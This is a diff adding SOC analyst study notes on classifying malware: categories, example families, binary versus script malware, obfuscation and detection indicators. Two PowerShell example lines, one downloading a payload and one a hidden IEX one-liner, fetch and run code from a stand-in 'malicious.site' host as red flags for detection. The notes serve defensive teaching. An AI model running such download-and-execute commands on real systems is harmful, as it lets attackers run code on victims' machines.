@@ -15662,3 +15662,205 @@ ausearch -i -f <file>
 - **Monitor cron and systemd for persistence.**
 - **Monitor new users and `authorized_keys` for account persistence.**
 - **Always investigate the full process tree and surrounding activity, not just one command.**
+
+# Malware Classification
+
+## Malware Categories
+
+Malware types are classified by their **main purpose and behaviour**.
+
+| Malware | Main Purpose | Common Behaviour |
+|---|---|---|
+| **Adware** | Show unwanted ads | Displays pop-ups and advertisements |
+| **Spyware** | Secretly monitor victims | Collects browsing activity, data, or screenshots |
+| **Ransomware** | Extort money | Encrypts files and demands payment |
+| **Wiper** | Destroy data | Deletes or overwrites files |
+| **C2 Malware** | Remote control | Connects to an attacker-controlled server and receives commands |
+| **Data Stealer** | Steal information | Steals credentials, cookies, files, or documents |
+| **Keylogger** | Capture keystrokes | Records everything typed |
+| **Cryptominer** | Mine cryptocurrency | Uses CPU/GPU resources and causes high system usage |
+
+### Quick Identification
+
+```text
+Pop-ups / Ads          → Adware
+Secret monitoring      → Spyware
+Files encrypted        → Ransomware
+Files destroyed        → Wiper
+Remote attacker access → C2
+Credentials / Files    → Data Stealer
+Keystrokes             → Keylogger
+High CPU/GPU usage     → Cryptominer
+```
+
+---
+
+# Malware Families
+
+A **malware family** is a group of related malware that shares code, origin, or behaviour.
+
+Examples:
+
+- **Pegasus** → Spyware
+- **Akira** → Ransomware
+- **Shamoon** → Wiper
+- **Agent Tesla** → Data Stealer
+- **RedLine** → Data Stealer / Keylogger
+- **QakBot** → C2 / RAT
+
+---
+
+# Binary vs Script Malware
+
+Malware can generally be delivered as either a **compiled binary** or a **script**.
+
+## Binary Malware
+
+Binary malware is compiled into executable files.
+
+Common formats:
+
+```text
+.exe → Windows executable
+.dll → Dynamic Link Library
+```
+
+Common delivery methods:
+
+- Malicious email attachments
+- Malicious downloads
+- USB/removable media
+- Other malware dropping the file
+
+Example:
+
+```text
+invoice.pdf.exe
+```
+
+### Binary Detection
+
+A **hash/checksum** can help identify a binary regardless of its filename.
+
+Example:
+
+```bash
+md5sum suspicious.exe
+```
+
+Other useful indicators include:
+
+- File hash
+- Embedded strings
+- File location
+- Digital signature
+- Parent process
+
+---
+
+# Script-Based Malware
+
+Script malware uses interpreters instead of being directly compiled into an executable.
+
+Common script types:
+
+```text
+.js   → JavaScript
+.vbs  → Visual Basic Script
+.bat  → Windows Batch
+.ps1  → PowerShell
+```
+
+Scripts are attractive to attackers because they are:
+
+- Easy to modify
+- Easy to distribute
+- Capable of downloading additional malware
+- Sometimes capable of executing code directly in memory
+
+## Script Malware Red Flags
+
+Look for scripts that:
+
+- Download files from the Internet
+- Execute downloaded files
+- Disable security tools
+- Modify system settings
+- Launch unusual processes
+- Use encoded or heavily obfuscated commands
+- Execute PowerShell or CMD unexpectedly
+
+Example:
+
+```powershell
+Invoke-WebRequest http://malicious.site/payload.exe -OutFile C:\Users\Public\payload.exe
+```
+
+The script downloads a payload to the victim.
+
+Another example:
+
+```powershell
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
+```
+
+This downloads and executes a remote PowerShell script.
+
+---
+
+# Obfuscation
+
+Attackers often **obfuscate** malware to make analysis and detection harder.
+
+Common techniques include:
+
+- Base64 encoding
+- Random variable/function names
+- Large encoded strings
+- Hidden PowerShell commands
+- Executing code directly in memory
+
+### Example
+
+A script may contain a large Base64-encoded string instead of readable commands:
+
+```text
+Encoded Data
+     ↓
+Base64 Decode
+     ↓
+Payload
+     ↓
+Execute in Memory
+```
+
+### SOC Detection
+
+When analyzing a suspicious script, pay attention to:
+
+```text
+Encoded content
++ 
+Obfuscated commands
++
+Network download
++
+Memory execution
+```
+
+This combination is a strong indicator of malicious activity.
+
+---
+
+# Key SOC Takeaways
+
+- **Malware is classified by what it does**, not simply by how it looks.
+- **Ransomware** encrypts data; **wipers** destroy it.
+- **Spyware** monitors victims, while **data stealers** focus on stealing useful information.
+- **Keyloggers** specifically capture keystrokes.
+- **C2 malware** provides attackers with remote control.
+- **Cryptominers** abuse CPU/GPU resources for cryptocurrency mining.
+- **Binary malware** is usually found as `.exe` or `.dll`.
+- **Script malware** commonly uses PowerShell, JavaScript, VBS, or Batch.
+- **Hashes, process behaviour, network connections, parent processes, and file locations** are useful when investigating binaries.
+- **Downloads, encoded commands, security-tool changes, and unusual child processes** are important indicators when investigating scripts.
